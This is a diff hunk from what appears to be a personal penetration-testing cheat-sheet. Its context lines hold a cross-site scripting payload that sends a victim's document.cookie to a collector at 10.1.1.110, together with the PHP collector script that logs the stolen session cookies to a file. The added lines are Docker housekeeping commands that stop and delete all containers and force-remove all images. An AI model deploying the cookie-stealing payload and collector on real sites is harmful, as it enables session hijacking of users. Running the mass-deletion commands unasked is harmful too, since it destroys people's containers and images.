@@ -602,3 +602,16 @@ var i=new Image(); i.src="http://10.1.1.110/c.php?q="+document.cookie;
 c.php that collects session cookies and stores them in a file:
 
 <?php $cookie = $_SERVER['QUERY_STRING']; $logfile=fopen("cookies.txt", "a+"); fputs($logfile, "COOKIE REC: $cookie" . PHP_EOL); fclose($logfile); ?>
+
+# ----- Dockers commands ----- #
+####List all containers (only IDs)
+docker ps -aq
+
+#### Stop all running containers
+docker stop $(docker ps -aq)
+
+#### Remove all containers
+docker rm $(docker ps -aq)
+
+#### Remove all images
+docker rmi -f $(docker images -q)
